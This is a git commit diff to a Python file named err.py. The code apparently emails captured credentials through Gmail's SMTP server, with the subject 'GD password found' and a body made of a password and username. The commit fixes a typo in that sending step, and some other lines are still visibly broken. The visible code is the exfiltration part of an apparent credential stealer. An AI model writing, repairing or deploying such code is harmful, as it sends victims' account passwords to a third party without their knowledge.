2ff17609b6e430a45bccf86a1e380ead6994d278
joeisme1 <48613468+joeisme1@users.noreply.github.com>
2019-06-08 19:27:50 -0700

    Update err.py

--- err.py
+++ err.py
@@ -9,7 +9,7 @@ content = ("pword + uname")
 with smtplib.SMTP("smtp.gmail.com:587") as smtp:
      smtp.ehlo()
      smtp.starttls()
-     smpt.ehlo
+     smtp.ehlo()
      subject = ("GD password found")
      body = pword + uname
      msg = f("Subject: {subject}\n\n{body}")
